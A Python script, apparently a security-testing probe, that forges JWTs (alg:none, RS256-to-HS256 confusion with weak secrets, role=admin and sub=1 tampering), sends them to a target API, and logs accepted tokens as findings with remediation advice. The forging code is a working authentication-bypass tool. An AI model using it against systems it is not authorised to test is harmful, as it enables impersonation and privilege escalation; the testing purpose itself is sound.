#!/usr/bin/env python3
"""Phase 1.2 / 1.3 — JWT algorithm confusion + claim tampering.

Reads:  TARGET, JWT_SAMPLE, PROTECTED_PATH (default /api/me), OUT_DIR (default ./out)
Writes: out/findings.jsonl

Requires PyJWT:  pip install pyjwt

Attacks:
  alg:none confusion  — replace alg with 'none' and drop signature
  HS256 with garbage  — keep payload, sign with weak secret
  Role/sub tampering  — set role=admin, sub=other_user
"""

# JWT claims and HTTP response bodies are intrinsically dynamic; Any is deliberate.
# pyright: reportAny=false, reportExplicitAny=false, reportUnknownMemberType=false, reportUnknownArgumentType=false, reportUnknownVariableType=false

from __future__ import annotations

import base64
import binascii
import json
import os
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

try:
    import jwt as pyjwt  # pyright: ignore[reportMissingImports]  # PyJWT (runtime dep)
except ImportError:
    print("ERROR: PyJWT is required. Install with: pip install pyjwt", file=sys.stderr)
    sys.exit(1)


TARGET          = os.environ.get("TARGET", "").rstrip("/")
JWT_SAMPLE      = os.environ.get("JWT_SAMPLE", "")
PROTECTED_PATH  = os.environ.get("PROTECTED_PATH", "/api/me")
OUT_DIR         = Path(os.environ.get("OUT_DIR", "./out"))
FINDINGS_FILE   = OUT_DIR / "findings.jsonl"

if not TARGET:
    print("ERROR: TARGET env var not set.", file=sys.stderr)
    sys.exit(1)
if not JWT_SAMPLE:
    print("ERROR: JWT_SAMPLE env var not set (provide a valid JWT to manipulate).", file=sys.stderr)
    sys.exit(1)


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)


def split_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Expected 3 JWT parts, got {len(parts)}")
    header_b64, payload_b64, sig_b64 = parts
    header_bytes  = base64.urlsafe_b64decode(_b64pad(header_b64))
    payload_bytes = base64.urlsafe_b64decode(_b64pad(payload_b64))
    header:  dict[str, Any] = json.loads(header_bytes)
    payload: dict[str, Any] = json.loads(payload_bytes)
    return header, payload, sig_b64


def craft_alg_none(payload: dict[str, Any]) -> str:
    """Build an alg:none token (no signature)."""
    header: dict[str, Any] = {"alg": "none", "typ": "JWT"}
    h_b64 = b64url(json.dumps(header,  separators=(",", ":")).encode())
    p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h_b64}.{p_b64}."


def craft_hs256_weak(payload: dict[str, Any], secret: str = "secret") -> str:
    """Sign payload with HS256 + weak secret (tests if server accepts HS256 when expecting RS256)."""
    token: Any = pyjwt.encode(payload, secret, algorithm="HS256")
    # PyJWT < 2.0 returns bytes, >= 2.0 returns str. Normalize.
    if isinstance(token, bytes):
        return token.decode("ascii")
    return str(token)


def http_get(path: str, token: str, timeout: int = 10) -> tuple[int, str]:
    url = TARGET + path
    req = urllib.request.Request(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "User-Agent":    "code-security-review-probe/1.0",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # type: ignore[no-untyped-call]
            raw: bytes = resp.read(2048)
            status: int = int(resp.status)
            return status, raw.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body_bytes: bytes = e.read(2048) or b""
        return int(e.code), body_bytes.decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        print(f"  ERROR: {url} unreachable ({e.reason})", file=sys.stderr)
        return 0, ""
    except (TimeoutError, ConnectionError) as e:
        print(f"  ERROR: {url} timed out / refused ({e})", file=sys.stderr)
        return 0, ""


def emit_finding(record: dict[str, Any]) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    record.setdefault("phase",     "02-jwt-attacks")
    record.setdefault("timestamp", now_iso())
    with FINDINGS_FILE.open("a", encoding="utf-8") as f:
        _ = f.write(json.dumps(record, separators=(",", ":")) + "\n")
    sev: str = str(record.get("severity", "info")).upper()
    endpoint: str = str(record.get("endpoint", "?"))
    finding_id: str = str(record.get("id", "?"))
    print(f"[{finding_id}] {sev} — {endpoint}", file=sys.stderr)


def run_attacks() -> None:
    print("[INFO] Decoding sample JWT...", file=sys.stderr)
    try:
        header, payload, _sig = split_jwt(JWT_SAMPLE)
    except (ValueError, json.JSONDecodeError, binascii.Error) as e:
        print(f"ERROR: cannot parse JWT_SAMPLE: {e}", file=sys.stderr)
        sys.exit(1)
    original_alg: str = str(header.get("alg", "?"))
    print(f"[INFO] Original alg: {original_alg}", file=sys.stderr)
    print(f"[INFO] Original payload claims: {list(payload.keys())}", file=sys.stderr)

    # --- Attack 1: alg:none ---
    print("[INFO] Attack 1/4: alg:none confusion...", file=sys.stderr)
    token = craft_alg_none(payload)
    status, body = http_get(PROTECTED_PATH, token)
    if status == 200:
        emit_finding({
            "id":          "JWT-001",
            "severity":    "critical",
            "owasp":       "API2:2023 Broken Authentication",
            "endpoint":    f"GET {PROTECTED_PATH}",
            "evidence":    {"status": status, "attack": "alg=none", "body_excerpt": body[:200]},
            "impact":      "Server accepts a JWT with alg=none — authentication is fully bypassed by anyone who can copy a token's payload structure.",
            "remediation": "Pin algorithms explicitly in jwt.decode (e.g. algorithms=['RS256']). Never accept 'none'.",
        })
    elif status in (401, 403):
        print(f"  OK — alg:none rejected (HTTP {status})", file=sys.stderr)
    else:
        print(f"  unexpected HTTP {status}", file=sys.stderr)

    # --- Attack 2: HS256 with weak secret (RS256→HS256 confusion) ---
    if original_alg.upper().startswith(("RS", "ES", "PS", "ED")):
        print("[INFO] Attack 2/4: RS256→HS256 confusion (weak HMAC secret)...", file=sys.stderr)
        candidate_secrets: list[str] = ["secret", "key", TARGET]
        kid_value = header.get("kid")
        if isinstance(kid_value, str) and kid_value:
            candidate_secrets.append(kid_value)

        confused_match: bool = False
        for secret in candidate_secrets:
            if not secret:
                continue
            token = craft_hs256_weak(payload, secret=secret)
            status, body = http_get(PROTECTED_PATH, token)
            if status == 200:
                emit_finding({
                    "id":          "JWT-002",
                    "severity":    "critical",
                    "owasp":       "API2:2023 Broken Authentication",
                    "endpoint":    f"GET {PROTECTED_PATH}",
                    "evidence":    {"status": status, "attack": "RS256->HS256", "secret_tried": secret[:32]},
                    "impact":      "Server accepts HS256-signed token when configured for RS256 — algorithm confusion lets an attacker forge any token using the public key as HMAC secret.",
                    "remediation": "Pin algorithms in jwt.decode (algorithms=['RS256']). Never use a single key field that auto-selects HS256 vs RS256.",
                })
                confused_match = True
                break
        if not confused_match:
            print("  OK — HS256 confusion rejected", file=sys.stderr)
    else:
        print("[INFO] Attack 2/4 skipped (sample is not asymmetric)", file=sys.stderr)

    # --- Attack 3: claim tampering — role=admin (only meaningful if alg:none or HS256 is accepted) ---
    print("[INFO] Attack 3/4: role=admin claim tampering via alg:none...", file=sys.stderr)
    tampered_role: dict[str, Any] = dict(payload)
    tampered_role["role"]     = "admin"
    tampered_role["roles"]    = ["admin"]
    tampered_role["is_admin"] = True
    tampered_role["scope"]    = "admin"
    token = craft_alg_none(tampered_role)
    status, body = http_get(PROTECTED_PATH, token)
    if status == 200 and ("admin" in body.lower() or '"role"' in body.lower()):
        emit_finding({
            "id":          "JWT-003",
            "severity":    "critical",
            "owasp":       "API5:2023 Broken Function Level Authorization",
            "endpoint":    f"GET {PROTECTED_PATH}",
            "evidence":    {"status": status, "attack": "alg=none + role=admin", "body_excerpt": body[:200]},
            "impact":      "Server accepts a tampered token with elevated role — privilege escalation via JWT manipulation.",
            "remediation": "Reject alg=none. Verify signature first, then enforce authorization based on a server-side RBAC store, not just JWT claims.",
        })

    # --- Attack 4: sub tampering — switch user identity ---
    print("[INFO] Attack 4/4: sub claim tampering (user impersonation)...", file=sys.stderr)
    tampered_sub: dict[str, Any] = dict(payload)
    original_sub: str = str(
        tampered_sub.get("sub")
        or tampered_sub.get("user_id")
        or tampered_sub.get("uid")
        or "?"
    )
    tampered_sub["sub"]     = "1"
    tampered_sub["user_id"] = "1"
    tampered_sub["uid"]     = "1"
    token = craft_alg_none(tampered_sub)
    status, body = http_get(PROTECTED_PATH, token)
    if status == 200:
        emit_finding({
            "id":          "JWT-004",
            "severity":    "critical",
            "owasp":       "API2:2023 Broken Authentication",
            "endpoint":    f"GET {PROTECTED_PATH}",
            "evidence":    {"status": status, "attack": "alg=none + sub=1", "original_sub": original_sub[:64]},
            "impact":      "Server accepts a tampered sub claim — full user impersonation possible.",
            "remediation": "Reject alg=none and verify signatures. Treat sub as authoritative only after signature verification.",
        })

    print("[OK] JWT attacks complete.", file=sys.stderr)


if __name__ == "__main__":
    run_attacks()
